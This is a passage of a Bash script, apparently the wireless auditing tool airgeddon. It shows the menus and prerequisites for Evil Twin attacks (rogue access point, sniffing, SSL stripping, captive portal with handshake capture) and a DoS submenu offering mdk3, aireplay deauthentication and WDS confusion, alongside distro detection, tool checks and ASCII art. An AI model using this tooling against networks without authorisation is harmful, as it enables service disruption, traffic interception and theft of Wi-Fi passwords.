	while [[ ${selected_target_network} -lt 1 ]] || [[ ${selected_target_network} -gt ${i} ]]; do
		echo
		language_strings "${language}" 72 "yellow"
		echo
		language_strings "${language}" 3 "green"
		read -r selected_target_network
	done

	essid=${network_names[${selected_target_network}]}
	channel=${channels[${selected_target_network}]}
	bssid=${macs[${selected_target_network}]}
	enc=${encs[${selected_target_network}]}
}

#Perform a test to determine if fcs parameter is needed on wash scanning
function set_wash_parametrization() {

	fcs=""
	declare -gA wash_ifaces_already_set
	readarray -t WASH_OUTPUT < <(timeout 1 wash -i "${interface}" 2> /dev/null)

	for item in "${WASH_OUTPUT[@]}"; do
		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
			fcs="-C"
			break
		fi
	done

	wash_ifaces_already_set[${interface}]=${fcs}
}

#Manage and validate the prerequisites for Evil Twin attacks
function et_prerequisites() {

	if [ ${retry_handshake_capture} -eq 1 ]; then
		return
	fi

	current_menu="evil_twin_attacks_menu"
	clear

	case ${et_mode} in
		"et_onlyap")
			language_strings "${language}" 270 "title"
		;;
		"et_sniffing")
			language_strings "${language}" 291 "title"
		;;
		"et_sniffing_sslstrip")
			language_strings "${language}" 292 "title"
		;;
		"et_captive_portal")
			language_strings "${language}" 293 "title"
		;;
	esac

	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	print_hint ${current_menu}
	echo

	if [ "${et_mode}" != "et_captive_portal" ]; then
		language_strings "${language}" 275 "blue"
		echo
		language_strings "${language}" 276 "yellow"
		print_simple_separator
		ask_yesno 277
		if [ ${yesno} = "n" ]; then
			return_to_et_main_menu=1
			return
		fi
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then

		language_strings "${language}" 315 "yellow"
		echo
		language_strings "${language}" 286 "pink"
		print_simple_separator
		if [ ${retrying_handshake_capture} -eq 0 ]; then
			ask_yesno 321
		fi

		if [[ ${yesno} = "n" ]] || [[ ${retrying_handshake_capture} -eq 1 ]]; then
			capture_handshake_evil_twin
			case "$?" in
				"2")
					retry_handshake_capture=1
					return
				;;
				"1")
					return_to_et_main_menu=1
					return
				;;
			esac
		else
			ask_et_handshake_file
		fi
		retry_handshake_capture=0
		retrying_handshake_capture=0
		internet_interface_selected=0

		check_bssid_in_captured_file "${et_handshake}"
		if [ "$?" != "0" ]; then
			return_to_et_main_menu=1
			return
		fi

		echo
		language_strings "${language}" 28 "blue"

		echo
		language_strings "${language}" 26 "blue"

		echo
		language_strings "${language}" 31 "blue"
	else
		ask_bssid
		ask_channel
		ask_essid
	fi

	if [[ "${et_mode}" = "et_sniffing" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip" ]]; then
		manage_ettercap_log
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		manage_captive_portal_log
		language_strings "${language}" 115 "read"
		set_captive_portal_language
		language_strings "${language}" 319 "blue"
	fi

	return_to_et_main_menu=1
	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"
	prepare_et_interface

	case ${et_mode} in
		"et_onlyap")
			exec_et_onlyap_attack
		;;
		"et_sniffing")
			exec_et_sniffing_attack
		;;
		"et_sniffing_sslstrip")
			exec_et_sniffing_sslstrip_attack
		;;
		"et_captive_portal")
			exec_et_captive_portal_attack
		;;
	esac
}

#Manage the Handshake file requirement for captive portal Evil Twin attack
function ask_et_handshake_file() {

	echo
	readpath=0

	if [[ -z "${enteredpath}" ]] && [[ -z "${et_handshake}" ]]; then
		language_strings "${language}" 312 "blue"
		readpath=1
	elif [[ -z "${enteredpath}" ]] && [[ -n "${et_handshake}" ]]; then
		language_strings "${language}" 313 "blue"
		ask_yesno 187
		if [ ${yesno} = "n" ]; then
			readpath=1
		fi
	elif [[ -n "${enteredpath}" ]] && [[ -z "${et_handshake}" ]]; then
		language_strings "${language}" 151 "blue"
		ask_yesno 187
		if [ ${yesno} = "y" ]; then
			et_handshake="${enteredpath}"
		else
			readpath=1
		fi
	elif [[ -n "${enteredpath}" ]] && [[ -n "${et_handshake}" ]]; then
		language_strings "${language}" 313 "blue"
		ask_yesno 187
		if [ ${yesno} = "n" ]; then
			readpath=1
		fi
	fi

	if [ ${readpath} -eq 1 ]; then
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "ethandshake"
		done
	fi
}

#DoS Evil Twin attacks menu
function et_dos_menu() {

	if [ ${return_to_et_main_menu} -eq 1 ]; then
		return
	fi

	clear
	language_strings "${language}" 265 "title"
	current_menu="et_dos_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 139 mdk3_attack_dependencies[@]
	language_strings "${language}" 140 aireplay_attack_dependencies[@]
	language_strings "${language}" 141 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings "${language}" 266
	print_hint ${current_menu}

	read -r et_dos_option
	case ${et_dos_option} in
		1)
			contains_element "${et_dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				et_dos_attack="Mdk3"
				if [ "${et_mode}" = "et_captive_portal" ]; then
					if [ ${internet_interface_selected} -eq 0 ]; then
						language_strings "${language}" 330 "blue"
						ask_yesno 326
						if [ ${yesno} = "n" ]; then
							check_et_without_internet_compatibility
							if [ "$?" = "0" ]; then
								captive_portal_mode="dnsblackhole"
								internet_interface_selected=1
								echo
								language_strings "${language}" 329 "yellow"
								language_strings "${language}" 115 "read"
								et_prerequisites
							else
								echo
								language_strings "${language}" 327 "yellow"
								language_strings "${language}" 115 "read"
								return_to_et_main_menu=1
								return
							fi
						else
							detect_internet_interface
							if [ "$?" = "0" ]; then
								et_prerequisites
							else
								return
							fi
						fi
					else
						et_prerequisites
					fi
				else
					detect_internet_interface
					if [ "$?" = "0" ]; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		2)
			contains_element "${et_dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				et_dos_attack="Aireplay"
				if [ "${et_mode}" = "et_captive_portal" ]; then
					if [ ${internet_interface_selected} -eq 0 ]; then
						language_strings "${language}" 330 "blue"
						ask_yesno 326
						if [ ${yesno} = "n" ]; then
							check_et_without_internet_compatibility
							if [ "$?" = "0" ]; then
								captive_portal_mode="dnsblackhole"
								internet_interface_selected=1
								echo
								language_strings "${language}" 329 "yellow"
								language_strings "${language}" 115 "read"
								et_prerequisites
							else
								echo
								language_strings "${language}" 327 "yellow"
								language_strings "${language}" 115 "read"
								return_to_et_main_menu=1
								return
							fi
						else
							detect_internet_interface
							if [ "$?" = "0" ]; then
								et_prerequisites
							else
								return
							fi
						fi
					else
						et_prerequisites
					fi
				else
					detect_internet_interface
					if [ "$?" = "0" ]; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		3)
			contains_element "${et_dos_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				et_dos_attack="Wds Confusion"
				if [ "${et_mode}" = "et_captive_portal" ]; then
					if [ ${internet_interface_selected} -eq 0 ]; then
						language_strings "${language}" 330 "blue"
						ask_yesno 326
						if [ ${yesno} = "n" ]; then
							check_et_without_internet_compatibility
							if [ "$?" = "0" ]; then
								captive_portal_mode="dnsblackhole"
								internet_interface_selected=1
								echo
								language_strings "${language}" 329 "yellow"
								language_strings "${language}" 115 "read"
								et_prerequisites
							else
								echo
								language_strings "${language}" 327 "yellow"
								language_strings "${language}" 115 "read"
								return_to_et_main_menu=1
								return
							fi
						else
							detect_internet_interface
							if [ "$?" = "0" ]; then
								et_prerequisites
							else
								return
							fi
						fi
					else
						et_prerequisites
					fi
				else
					detect_internet_interface
					if [ "$?" = "0" ]; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		4)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	et_dos_menu
}

#Selected internet interface detection
function detect_internet_interface() {

	if [ ${internet_interface_selected} -eq 1 ]; then
		return 0
	fi

	if [ -n "${internet_interface}" ]; then
		echo
		language_strings "${language}" 285 "blue"
		ask_yesno 284
		if [ ${yesno} = "n" ]; then
			select_internet_interface
		fi
	else
		select_internet_interface
	fi

	if [ "$?" != "0" ]; then
		return 1
	fi

	validate_et_internet_interface
	return $?
}

#Show about and credits
function credits_option() {

	clear
	language_strings "${language}" 105 "title"
	language_strings "${language}" 74 "pink"
	echo
	language_strings "${language}" 73 "blue"
	echo
	echo -e "${green_color}                                                            .-\"\"\"\"-."
	sleep 0.15 && echo -e "                                                           /        \ "
	sleep 0.15 && echo -e "${yellow_color}         ____        ____  __   _______                  ${green_color} /_        _\ "
	sleep 0.15 && echo -e "${yellow_color}  ___  _/_   | _____/_   |/  |_ \   _  \_______         ${green_color} // \      / \\\\\ "
	sleep 0.15 && echo -e "${yellow_color}  \  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \        ${green_color} |\__\    /__/|"
	sleep 0.15 && echo -e "${yellow_color}   \   / |   |\___ \ |   ||  |  \  \_/   \  | \/         ${green_color} \    ||    /"
	sleep 0.15 && echo -e "${yellow_color}    \_/  |___/____  >|___||__|   \_____  /__|             ${green_color} \        /"
	sleep 0.15 && echo -e "${yellow_color}                  \/                   \/                  ${green_color} \  __  / "
	sleep 0.15 && echo -e "                                                             '.__.'"
	sleep 0.15 && echo -e "                                                              |  |${normal_color}"
	echo
	language_strings "${language}" 75 "blue"
	echo
	language_strings "${language}" 85 "pink"
	language_strings "${language}" 107 "pink"
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected language
function invalid_language_selected() {

	echo
	language_strings "${language}" 82 "yellow"
	echo
	language_strings "${language}" 115 "read"
	echo
	language_menu
}

#Show message for captive portal invalid selected language
function invalid_captive_portal_language_selected() {

	language_strings "${language}" 82 "yellow"
	echo
	language_strings "${language}" 115 "read"
	set_captive_portal_language
}

#Show message for forbidden selected option
function forbidden_menu_option() {

	echo
	language_strings "${language}" 220 "yellow"
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected option
function invalid_menu_option() {

	echo
	language_strings "${language}" 76 "yellow"
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected interface
function invalid_iface_selected() {

	echo
	language_strings "${language}" 77 "yellow"
	echo
	language_strings "${language}" 115 "read"
	echo
	select_interface
}

#Show message for invalid selected internet interface
function invalid_internet_iface_selected() {

	echo
	language_strings "${language}" 77 "yellow"
	echo
	language_strings "${language}" 115 "read"
	echo
	select_internet_interface
}

#Manage behavior of captured traps
function capture_traps() {

	case ${current_menu} in
		"pre_main_menu"|"select_interface_menu")
			exit_code=1
			exit_script_option
		;;
		*)
			ask_yesno 12
			if [ ${yesno} = "y" ]; then
				exit_code=1
				exit_script_option
			else
				language_strings "${language}" 224 "blue"
				if [ "${last_buffered_type1}" = "read" ]; then
					language_strings "${language}" "${last_buffered_message2}" "${last_buffered_type2}"
				else
					language_strings "${language}" "${last_buffered_message1}" "${last_buffered_type1}"
				fi
			fi
		;;
	esac
}

#Exit the script managing possible pending tasks
function exit_script_option() {

	action_on_exit_taken=0
	echo
	language_strings "${language}" 106 "title"
	language_strings "${language}" 11 "blue"

	echo
	language_strings "${language}" 165 "blue"

	if [ "${ifacemode}" = "Monitor" ]; then
		ask_yesno 166
		if [ ${yesno} = "n" ]; then
			action_on_exit_taken=1
			language_strings "${language}" 167 "multiline"
			${airmon} stop "${interface}" > /dev/null 2>&1
			time_loop
			echo -e "${green_color} Ok\r${normal_color}"
		fi
	fi

	if [ ${nm_processes_killed} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 168 "multiline"
		eval "${networkmanager_cmd} > /dev/null 2>&1"
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${tmpfiles_toclean} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 164 "multiline"
		clean_tmpfiles
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${routing_toclean} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 297 "multiline"
		clean_routing_rules
		killall dhcpd > /dev/null 2>&1
		killall hostapd > /dev/null 2>&1
		killall lighttpd > /dev/null 2>&1
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${action_on_exit_taken} -eq 0 ]; then
		language_strings "${language}" 160 "yellow"
	fi

	echo
	exit ${exit_code}
}

#Generate a small time loop printing some dots
function time_loop() {

	echo -ne " "
	for (( j=1; j<=4; j++ )); do
		echo -ne "."
		sleep 0.035
	done
}

#Determine which version of airmon to use
function airmon_fix() {

	airmon="airmon-ng"

	if hash airmon-zc 2> /dev/null; then
		airmon="airmon-zc"
	fi
}

#Prepare the fix for iwconfig command depending of the wireless tools version
function iwconfig_fix() {

	iwversion=$(iwconfig --version | grep version | awk '{print $4}')
	iwcmdfix=""
	if [ "${iwversion}" -lt 30 ]; then
		iwcmdfix=" 2> /dev/null | grep Mode: "
	fi
}

#Set hashcat parameters based on version
function set_hashcat_parameters() {

	hashcat_fix=""
	if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat3_version}"; then
		hashcat_fix=" -D 1 --force"
	fi
}

#Determine hashcat version
function get_hashcat_version() {

	hashcat_version=$(hashcat -V 2> /dev/null)
	hashcat_version=${hashcat_version#"v"}
}

#Determine bully version
function get_bully_version() {

	bully_version=$(bully -V 2> /dev/null)
	bully_version=${bully_version#"v"}
}

#Determine reaver version
function get_reaver_version() {

	reaver_version=$(reaver -h 2>&1 > /dev/null | egrep "^Reaver v[0-9]" | awk '{print $2}')
	if [ -z "${reaver_version}" ]; then
		reaver_version=$(reaver -h 2> /dev/null | egrep "^Reaver v[0-9]" | awk '{print $2}')
	fi
	reaver_version=${reaver_version#"v"}
}

#Set verbosity for bully based on version
function set_bully_verbosity() {

	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_verbosity4_version}"; then
		bully_verbosity="4"
	else
		bully_verbosity="3"
	fi
}

#Validate if bully version is able to perform integrated pixiewps attack
function validate_bully_pixiewps_version() {

	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_pixiewps_version}"; then
		return 0
	fi
	return 1
}

#Validate if reaver version is able to perform integrated pixiewps attack
function validate_reaver_pixiewps_version() {

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_pixiewps_version}"; then
		return 0
	fi
	return 1
}

#Check for possible non Linux operating systems
function non_linux_os_check() {

	case "${OSTYPE}" in
		solaris*)
			distro="Solaris"
		;;
		darwin*)
			distro="Mac OSX"
		;;
		bsd*)
			distro="FreeBSD"
		;;
	esac
}

#First phase of Linux distro detection based on uname output
function detect_distro_phase1() {

	for i in "${known_compatible_distros[@]}"; do
		uname -a | grep "${i}" -i > /dev/null
		if [ "$?" = "0" ]; then
			distro="${i^}"
			break
		fi
	done
}

#Second phase of Linux distro detection based on architecture and version file
function detect_distro_phase2() {

	if [ "${distro}" = "Unknown Linux" ]; then
		if [ -f ${osversionfile_dir}"centos-release" ]; then
			distro="CentOS"
		elif [ -f ${osversionfile_dir}"fedora-release" ]; then
			distro="Fedora"
		elif [ -f ${osversionfile_dir}"gentoo-release" ]; then
			distro="Gentoo"
		elif [ -f ${osversionfile_dir}"openmandriva-release" ]; then
			distro="OpenMandriva"
		elif [ -f ${osversionfile_dir}"redhat-release" ]; then
			distro="Red Hat"
		elif [ -f ${osversionfile_dir}"SuSE-release" ]; then
			distro="SuSE"
		elif [ -f ${osversionfile_dir}"debian_version" ]; then
			distro="Debian"
			if [ -f ${osversionfile_dir}"os-release" ]; then
				is_raspbian=$(cat < ${osversionfile_dir}"os-release" | grep "PRETTY_NAME")
				if [[ "${is_raspbian}" =~ Raspbian ]]; then
					distro="Raspbian"
					is_arm=1
				fi
			fi
		fi
	fi

	detect_arm_architecture
}

#Detect if arm architecture is present on system
function detect_arm_architecture() {

	uname -m | grep -i "arm" > /dev/null

	if [[ "$?" = "0" ]] && [[ "${distro}" != "Unknown Linux" ]] && [[ "${distro}" != "Raspbian" ]]; then
		distro="${distro} arm"
		is_arm=1
	fi
}

#Set some useful vars based on Linux distro
function special_distro_features() {

	case ${distro} in
		"Wifislax")
			networkmanager_cmd="service restart networkmanager"
			xratio=7
			yratio=15.1
			ywindow_edge_lines=1
			ywindow_edge_pixels=-14
		;;
		"Backbox")
			networkmanager_cmd="service network-manager restart"
			xratio=6
			yratio=14.2
			ywindow_edge_lines=1
			ywindow_edge_pixels=15
		;;
		"Ubuntu")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Kali"|"Kali arm")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Debian")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=14
		;;
		"SuSE")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"CentOS")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Parrot"|"Parrot arm")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Arch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Fedora")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6
			yratio=14.1
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Gentoo")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.6
			ywindow_edge_lines=1
			ywindow_edge_pixels=-10
		;;
		"Red Hat")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=15.3
			ywindow_edge_lines=1
			ywindow_edge_pixels=10
		;;
		"Cyborg")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14.5
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Blackarch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=7.3
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=1
		;;
		"Raspbian")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=20
		;;
		"OpenMandriva")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=2
			ywindow_edge_pixels=-10
		;;
	esac
}

#Determine if NetworkManager must be killed on your system. Only needed for previous versions of 1.0.12
function check_if_kill_needed() {

	nm_min_main_version="1"
	nm_min_subversion="0"
	nm_min_subversion2="12"

	if ! hash NetworkManager 2> /dev/null; then
		check_kill_needed=0
	else
		nm_system_version=$(NetworkManager --version 2> /dev/null)

		if [ "${nm_system_version}" != "" ]; then

			[[ ${nm_system_version} =~ ^([0-9]{1,2})\.([0-9]{1,2})\.([0-9]+).*?$ ]] && nm_main_system_version="${BASH_REMATCH[1]}" && nm_system_subversion="${BASH_REMATCH[2]}" && nm_system_subversion2="${BASH_REMATCH[3]}"

			if [ "${nm_main_system_version}" -lt ${nm_min_main_version} ]; then
				check_kill_needed=1
			elif [ "${nm_main_system_version}" -eq ${nm_min_main_version} ]; then

				if [ "${nm_system_subversion}" -lt ${nm_min_subversion} ]; then
					check_kill_needed=1
				elif [ "${nm_system_subversion}" -eq ${nm_min_subversion} ]; then

					if [ "${nm_system_subversion2}" -lt ${nm_min_subversion2} ]; then
						check_kill_needed=1
					fi
				fi
			fi
		else
			check_kill_needed=1
		fi
	fi
}

#Do some checks for some general configuration
function general_checkings() {

	compatible=0
	distro="Unknown Linux"

	detect_distro_phase1
	detect_distro_phase2
	special_distro_features
	check_if_kill_needed

	if [ "${distro}" = "Unknown Linux" ]; then
		non_linux_os_check
		echo -e "${yellow_color}${distro}${normal_color}"
	else
		echo -e "${yellow_color}${distro} Linux${normal_color}"
	fi

	check_compatibility
	if [ ${compatible} -eq 1 ]; then
		return
	fi

	check_root_permissions

	language_strings "${language}" 115 "read"
	exit_code=1
	exit_script_option
}

#Check if the user is root
function check_root_permissions() {

	user=$(whoami)

	if [ "${user}" != "root" ]; then
		language_strings "${language}" 223 "yellow"
	fi
}

#Print Linux known distros
function print_known_distros() {

	for i in "${known_compatible_distros[@]}"; do
		echo -ne "${pink_color}\"${i}\" ${normal_color}"
	done
	echo
}

#Check if you have installed the tools (essential and optional) that the script uses
function check_compatibility() {

	echo
	language_strings "${language}" 108 "blue"
	language_strings "${language}" 115 "read"

	echo
	language_strings "${language}" 109 "blue"

	essential_toolsok=1
	for i in "${essential_tools_names[@]}"; do
		echo -ne "${i}"
		time_loop
		if ! hash "${i}" 2> /dev/null; then
			echo -ne "${red_color} Error${normal_color}"
			essential_toolsok=0
			echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
			echo -e "\r"
		else
			echo -e "${green_color} Ok\r${normal_color}"
		fi
	done

	echo
	language_strings "${language}" 218 "blue"

	optional_toolsok=1
	for i in "${!optional_tools[@]}"; do
		echo -ne "${i}"
		time_loop
		if ! hash "${i}" 2> /dev/null; then
			echo -ne "${red_color} Error${normal_color}"
			optional_toolsok=0
			echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
			echo -e "\r"
		else
			echo -e "${green_color} Ok\r${normal_color}"
			optional_tools[${i}]=1
		fi
	done

	update_toolsok=1
	if [ ${auto_update} -eq 1 ]; then

		echo
		language_strings "${language}" 226 "blue"

		for i in "${update_tools[@]}"; do
			echo -ne "${i}"
			time_loop
			if ! hash "${i}" 2> /dev/null; then
				echo -ne "${red_color} Error${normal_color}"
				update_toolsok=0
				echo -ne " (${possible_package_names[${language}]} : ${possible_package_names[${i}]})"
				echo -e "\r"
			else
				echo -e "${green_color} Ok\r${normal_color}"
			fi
		done
	fi

	if [ ${essential_toolsok} -eq 0 ]; then
		echo
		language_strings "${language}" 111 "yellow"
		echo
		return
	fi

	compatible=1

	if [ ${optional_toolsok} -eq 0 ]; then
		echo
		language_strings "${language}" 219 "yellow"
		echo
		return
	fi

	echo
	language_strings "${language}" 110 "yellow"
}

#Check for the minimum bash version requirement
function check_bash_version() {

	echo
	bashversion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"
	if compare_floats_greater_or_equal "${bashversion}" ${minimum_bash_version_required}; then
		language_strings "${language}" 221 "yellow"
	else
		language_strings "${language}" 222 "yellow"
		exit_code=1
		exit_script_option
	fi
}

#Check if you have installed the tools required to update the script
function check_update_tools() {

	if [ ${auto_update} -eq 1 ]; then
		if [ ${update_toolsok} -eq 1 ]; then
			autoupdate_check
		else
			echo
			language_strings "${language}" 225 "yellow"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Print the script intro
function print_intro() {

	echo -e "${yellow_color}                  .__                         .___  .___"
	sleep 0.15 && echo -e "           _____  |__|______  ____   ____   __| _/__| _/____   ____"
	sleep 0.15 && echo -e "           \__  \ |  \_  __ \/ ___\_/ __ \ / __ |/ __ |/  _ \ /    \\"
	sleep 0.15 && echo -e "            / __ \|  ||  | \/ /_/  >  ___// /_/ / /_/ (  <_> )   |  \\"
	sleep 0.15 && echo -e "           (____  /__||__|  \___  / \___  >____ \____ |\____/|___|  /"
	sleep 0.15 && echo -e "                \/         /_____/      \/     \/    \/           \/${normal_color}"
	echo
	language_strings "${language}" 228 "green"
	print_animated_flying_saucer
	sleep 1
}

#Generate the frames of the animated ascii art flying saucer
function flying_saucer() {

	case ${1} in
		1)
			echo "                                                             "
			echo "                         .   *       _.---._  *              "
			echo "                                   .'       '.       .       "
			echo "                               _.-~===========~-._          *"
			echo "                           *  (___________________)     .    "
			echo "                       .     .      \_______/    *           "
		;;
		2)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
		3)
			echo "                                   *                .        "
			echo "                             *       _.---._              *  "
			echo "                          .        .'       '.       *       "
			echo "                       .       _.-~===========~-._     *     "
			echo "                              (___________________)         ."
			echo "                       *            \_______/ .              "
		;;
		4)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
	esac
	sleep 0.4
}

#Print animated ascii art flying saucer
function print_animated_flying_saucer() {

	echo -e "\033[s"

	for i in $(seq 1 8); do
		if [ "${i}" -le 4 ]; then
			saucer_frame=${i}
		else
			saucer_frame=$((i-4))
		fi
		echo -e "\033[u"
		flying_saucer ${saucer_frame}
	done
}

#Initialize script settings
function initialize_script_settings() {

	exit_code=0
	check_kill_needed=0
	nm_processes_killed=0
	airmon_fix
	autochanged_language=0
	tmpfiles_toclean=0
	routing_toclean=0
	dhcpd_path_changed=0
	xratio=6.2
	yratio=13.9
	ywindow_edge_lines=2
	ywindow_edge_pixels=18
	networkmanager_cmd="service network-manager restart"
	is_arm=0
}

#Detect screen resolution if possible
function detect_screen_resolution() {

	resolution_detected=0
	if hash xdpyinfo 2> /dev/null; then
		resolution=$(xdpyinfo 2> /dev/null | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x")

		if [ "$?" = "0" ]; then
			resolution_detected=1
		fi
	fi

	if [ ${resolution_detected} -eq 0 ]; then
		resolution=${standard_resolution}
	fi

	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
}

#Set windows sizes and positions
function set_windows_sizes() {

	set_xsizes
	set_ysizes
	set_ypositions

	g1_topleft_window="${xwindow}x${ywindowhalf}+0+0"
	g1_bottomleft_window="${xwindow}x${ywindowhalf}+0-0"
	g1_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g1_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g2_stdleft_window="${xwindow}x${ywindowone}+0+0"
	g2_stdright_window="${xwindow}x${ywindowone}-0+0"

	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${middle_position}"
	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${middle_position}"
	g4_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
	g4_middleright_window="${xwindow}x${ywindowthird}-0+${middle_position}"
	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"
}

#Set sizes for x axis
function set_xsizes() {

	xtotal=$(awk -v n1="${resolution_x}" "BEGIN{print n1 / ${xratio}}")

	xtotaltmp=$(printf "%.0f" "${xtotal}" 2> /dev/null)
	if [ "$?" != "0" ]; then
		dec_char=","
		xtotal="${xtotal/./${dec_char}}"
		xtotal=$(printf "%.0f" "${xtotal}" 2> /dev/null)
	else
		xtotal=${xtotaltmp}
	fi

	xcentral_space=$((xtotal * 5 / 100))
	xhalf=$((xtotal / 2))
	xwindow=$((xhalf - xcentral_space))
}

#Set sizes for y axis
function set_ysizes() {

	ytotal=$(awk -v n1="${resolution_y}" "BEGIN{print n1 / ${yratio}}")
	ytotaltmp=$(printf "%.0f" "${ytotal}" 2> /dev/null)
	if [ "$?" != "0" ]; then
		dec_char=","
		ytotal="${ytotal/./${dec_char}}"
		ytotal=$(printf "%.0f" "${ytotal}" 2> /dev/null)
	else
		ytotal=${ytotaltmp}
	fi

	ywindowone=$((ytotal - ywindow_edge_lines))
	ywindowhalf=$((ytotal / 2 - ywindow_edge_lines))
	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
}

#Set positions for y axis
function set_ypositions() {

	middle_position=$((resolution_y / 3 + ywindow_edge_pixels))
}

#Recalculate windows sizes and positions
function recalculate_windows_sizes() {

	detect_screen_resolution
	set_windows_sizes
}

#Script starting point
function welcome() {

	clear
	current_menu="pre_main_menu"
	initialize_script_settings

	if [ ${auto_change_language} -eq 1 ]; then
		autodetect_language
	fi

	detect_screen_resolution

	if [ ${debug_mode} -eq 0 ]; then
		language_strings "${language}" 86 "title"
		language_strings "${language}" 6 "blue"
		echo
		print_intro

		clear
		language_strings "${language}" 86 "title"
		language_strings "${language}" 7 "pink"
		language_strings "${language}" 114 "pink"

		if [ ${autochanged_language} -eq 1 ]; then
			echo
			language_strings "${language}" 2 "yellow"
		fi

		check_bash_version

		echo
		if [ ${resolution_detected} -eq 1 ]; then
			language_strings "${language}" 294 "blue"
		else
			language_strings "${language}" 295 "blue"
			echo
			language_strings "${language}" 300 "yellow"
		fi

		echo
		language_strings "${language}" 8 "blue"
		print_known_distros
		echo
		language_strings "${language}" 9 "blue"
		general_checkings
		language_strings "${language}" 115 "read"

		airmonzc_security_check
		check_update_tools
	fi

	set_windows_sizes
	select_interface
	initialize_menu_options_dependencies
	remove_warnings
	main_menu
}

#Avoid the problem of using airmon-zc without ethtool or lspci installed
function airmonzc_security_check() {

	if [ "${airmon}" = "airmon-zc" ]; then
		if ! hash ethtool 2> /dev/null; then
			echo
			language_strings "${language}" 247 "yellow"
			echo
			language_strings "${language}" 115 "read"
			exit_code=1
			exit_script_option
